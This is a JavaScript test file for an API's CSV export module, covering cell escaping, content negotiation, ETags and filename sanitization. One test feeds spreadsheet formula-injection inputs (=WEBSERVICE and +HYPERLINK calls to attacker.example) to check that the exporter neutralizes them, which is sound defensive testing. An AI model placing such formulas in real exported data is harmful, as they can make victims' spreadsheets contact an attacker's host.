import assert from "node:assert/strict";
import { test } from "vitest";
import { csvRequested, csvResponse, rowsToCsv } from "../workers/csv.mjs";

function url(search = "") {
  return new URL(`https://api.metagraph.sh/api/v1/subnets${search}`);
}

function req(headers = {}, method = "GET") {
  return new Request("https://api.metagraph.sh/api/v1/subnets", {
    method,
    headers,
  });
}

test("rowsToCsv returns an empty body for empty rows without explicit columns", () => {
  assert.equal(rowsToCsv([]), "");
});

test("rowsToCsv emits explicit columns for empty rows", () => {
  assert.equal(rowsToCsv([], ["netuid", "name"]), "netuid,name");
});

test("rowsToCsv accepts explicit columns with a non-array row input", () => {
  assert.equal(rowsToCsv(null, ["netuid"]), "netuid");
});

test("rowsToCsv skips malformed rows when deriving columns", () => {
  assert.equal(
    rowsToCsv([null, ["bad"], { netuid: 7 }]),
    "netuid\r\n\r\n\r\n7",
  );
});

test("rowsToCsv uses first-seen union column order and escapes RFC 4180 cells", () => {
  const csv = rowsToCsv([
    { a: "plain", b: "comma,value", c: 'quote "value"' },
    { b: "line\nfeed", d: "carriage\rreturn" },
  ]);

  assert.equal(
    csv,
    'a,b,c,d\r\nplain,"comma,value","quote ""value""",\r\n,"line\nfeed",,"carriage\rreturn"',
  );
});

test("rowsToCsv serializes nulls, arrays, and objects predictably", () => {
  const csv = rowsToCsv([
    {
      missing: null,
      tags: ["inference", "validators", { nested: true }],
      metadata: { ok: true, count: 2 },
      empty: undefined,
    },
  ]);

  assert.equal(
    csv,
    'missing,tags,metadata,empty\r\n,"inference;validators;{""nested"":true}","{""ok"":true,""count"":2}",',
  );
});

test("rowsToCsv neutralizes spreadsheet formula-leading cells", () => {
  const csv = rowsToCsv([
    {
      eq: '=WEBSERVICE("https://attacker.example")',
      plus: '+HYPERLINK("https://attacker.example")',
      minus: "-2+3",
      at: "@SUM(1,1)",
      tab: "\t=1+1",
      tags: ["=evil", "safe"],
    },
  ]);

  const expected = `eq,plus,minus,at,tab,tags\r\n"'=WEBSERVICE(""https://attacker.example"")","'+HYPERLINK(""https://attacker.example"")",'-2+3,"'@SUM(1,1)",'\t=1+1,'=evil;safe`;
  assert.equal(csv, expected);
});

test("csvRequested honors format and Accept negotiation", () => {
  assert.equal(csvRequested(url("?format=csv"), req()), true);
  assert.equal(
    csvRequested(url(), req({ accept: "application/json, text/csv" })),
    true,
  );
  assert.equal(
    csvRequested(url("?format=json"), req({ accept: "text/csv" })),
    false,
  );
  assert.equal(csvRequested(url(), req({ accept: "text/csv;q=0" })), false);
  assert.equal(csvRequested(url(), req({ accept: "text/csv;q=bogus" })), false);
  assert.equal(csvRequested(url(), req({ accept: "text/csv;q=-0.1" })), false);
  assert.equal(csvRequested(url(), req({ accept: "text/csv;q=1.1" })), false);
  assert.equal(
    csvRequested(url(), req({ accept: "application/json, text/csv;q=0.25" })),
    false,
  );
  assert.equal(
    csvRequested(
      url(),
      req({ accept: "application/json;q=0.5, text/csv;q=0.75" }),
    ),
    true,
  );
  assert.equal(
    csvRequested(url(), req({ accept: "text/csv, application/json" })),
    true,
  );
  assert.equal(csvRequested(url(), req({ accept: "application/json" })), false);
  assert.equal(csvRequested(url(), req()), false);
});

test("csvResponse emits CSV download headers and a conditional ETag", async () => {
  const first = await csvResponse(
    [{ netuid: 7, name: "Allways" }],
    "subnets",
    "standard",
  );
  assert.equal(first.status, 200);
  assert.match(first.headers.get("content-type"), /^text\/csv/);
  assert.equal(
    first.headers.get("content-disposition"),
    'attachment; filename="subnets.csv"',
  );
  assert.ok(first.headers.get("etag"));
  assert.equal(await first.text(), "netuid,name\r\n7,Allways");

  const matched = await csvResponse(
    [{ netuid: 7, name: "Allways" }],
    "subnets",
    "standard",
    req({ "if-none-match": first.headers.get("etag") }),
  );
  assert.equal(matched.status, 304);
  assert.equal(await matched.text(), "");
});

test("csvResponse sanitizes download filenames", async () => {
  const withExtension = await csvResponse([], "subnets.csv", "standard");
  assert.equal(
    withExtension.headers.get("content-disposition"),
    'attachment; filename="subnets.csv"',
  );

  const withSpaces = await csvResponse([], "unsafe report", "standard");
  assert.equal(
    withSpaces.headers.get("content-disposition"),
    'attachment; filename="unsafe-report.csv"',
  );

  const emptyStem = await csvResponse([], "///", "standard");
  assert.equal(
    emptyStem.headers.get("content-disposition"),
    'attachment; filename="export.csv"',
  );

  const missingName = await csvResponse([], "", "standard");
  assert.equal(
    missingName.headers.get("content-disposition"),
    'attachment; filename="export.csv"',
  );
});

test("csvResponse suppresses the body on HEAD", async () => {
  const response = await csvResponse(
    [{ netuid: 7, name: "Allways" }],
    "subnets",
    "standard",
    req({}, "HEAD"),
  );
  assert.equal(response.status, 200);
  assert.equal(await response.text(), "");
});
